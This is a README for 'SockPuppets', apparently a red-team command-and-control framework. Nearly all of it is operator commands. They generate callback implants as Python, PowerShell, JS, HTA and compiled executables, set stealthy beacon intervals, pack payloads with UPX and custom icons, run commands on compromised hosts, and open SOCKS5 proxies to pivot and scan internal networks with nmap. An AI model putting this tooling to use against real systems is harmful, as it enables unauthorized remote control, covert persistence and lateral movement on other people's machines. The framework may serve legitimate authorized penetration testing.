# SockPuppets

```
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
|   __|     |     |  |  |  _  |  |  |  _  |  _  |   __|_   _|   __|
|__   |  |  |   --|    -|   __|  |  |   __|   __|   __|  |  |__   |
|_____|_____|_____|__|__|__|  |_____|__|  |__|  |_____|  |  |_____|

                    by AJ Hammond @ajm4n
```

not a good c2. websockets based command-and-control framework designed for stage0/stage0.5. 



<br>

***shoutout and special thanks to:***

skyler knecht @skylerknecht

jeremy schoeneman @y4utj4

matt jackoski @ds-koolaid

mason davis @mas0nd

kevin clark @clarkkev
##  Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/ajm4n/sockpuppets.git
cd sockpuppets

# Install dependencies
pip install -r requirements.txt

# Optional: Install UPX for compression
# macOS: brew install upx
# Linux: apt-get install upx
# Windows: Download from https://upx.github.io/
```

### Basic Usage

```bash
# Start the interactive CLI
python main.py

# Start the server
sockpuppets> start 0.0.0.0 8443

# Generate agents (all formats)
sockpuppets> generate 192.168.1.100 8443

# Generate with custom encryption key
sockpuppets> generate 192.168.1.100 8443 --key=MySecretKey2026

# Generate beacon agent (stealthy, 5-minute check-ins)
sockpuppets> generate 192.168.1.100 8443 --beacon --interval=300

# Compile to executables (all architectures)
sockpuppets> generate 192.168.1.100 8443 --multi-arch

# View connected agents
sockpuppets> agents

# Interact with an agent
sockpuppets> interact <agent_id>
```

```bash
# Start server with default settings
sockpuppets> start

# Start on specific interface and port
sockpuppets> start 0.0.0.0 9999

# Start with custom encryption key
sockpuppets> start 0.0.0.0 8443 --key=CustomKey123

# Stop the server
sockpuppets> stop
```

### Agent Generation

#### Basic Generation
```bash
# Generate all agent types (Python, PowerShell, JS, HTA)
sockpuppets> generate 192.168.1.100 8443

# With custom encryption key (must match server key)
sockpuppets> generate 192.168.1.100 8443 --key=CustomKey123
```

#### Beacon Mode (Stealth)
```bash
# Beacon mode with 10-minute intervals
sockpuppets> generate target.com 443 --beacon --interval=600

# Beacon with 1-hour intervals
sockpuppets> generate target.com 443 --beacon --interval=3600
```

#### Executable Compilation
```bash
# Compile for x64 (default)
sockpuppets> generate 192.168.1.100 8443 --compile

# Compile for specific architecture
sockpuppets> generate 192.168.1.100 8443 --compile --arch=x86
sockpuppets> generate 192.168.1.100 8443 --compile --arch=arm64

# Compile for all architectures
sockpuppets> generate 192.168.1.100 8443 --multi-arch

# With custom icon (Windows only)
sockpuppets> generate 192.168.1.100 8443 --compile --icon=app.ico

# Without UPX compression
sockpuppets> generate 192.168.1.100 8443 --compile --no-upx
```
### Agent Interaction

Once an agent connects:

```bash
# List all agents (shows mode, status, beacon intervals)
sockpuppets> agents

# Interact with specific agent
sockpuppets> interact a1b2c3d4

# Execute commands
agent[a1b2c3d4]> whoami
agent[a1b2c3d4]> pwd
agent[a1b2c3d4]> ls -la

# Start SOCKS5 proxy
agent[a1b2c3d4]> socks 1080

# Adjust beacon interval (beacon mode only)
agent[a1b2c3d4]> sleep 300

# Upgrade to streaming mode (real-time)
agent[a1b2c3d4]> upgrade

# Downgrade to beacon mode (stealth)
agent[a1b2c3d4]> downgrade 600

# Return to main menu
agent[a1b2c3d4]> back
```

### SOCKS5 Proxy 

After starting a SOCKS proxy on an agent:

```bash
# Use with curl
curl --socks5 127.0.0.1:1080 http://internal-server

# Use with proxychains
# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 1080
proxychains nmap -sT 10.0.0.0/24

# Use with browser
# Configure browser SOCKS5 proxy: 127.0.0.1:1080
```

### Docker Deployment

```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY . .
RUN pip install -r requirements.txt
EXPOSE 8443
CMD ["python", "server.py", "--host", "0.0.0.0", "--port", "8443"]
```
